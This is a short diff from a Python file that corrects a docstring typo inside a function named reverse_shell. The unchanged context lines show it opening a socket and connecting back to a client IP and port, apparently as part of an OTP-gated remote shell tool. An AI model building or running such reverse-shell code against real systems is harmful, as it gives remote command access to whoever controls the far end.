@@ -47,7 +47,7 @@ def check_OTP(port_otp):
 
 
 def reverse_shell(client_ip, port_reverse_shell):
-  """ Send shell do client """
+  """ Send shell to client """
 
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
   s.connect((client_ip, port_reverse_shell))
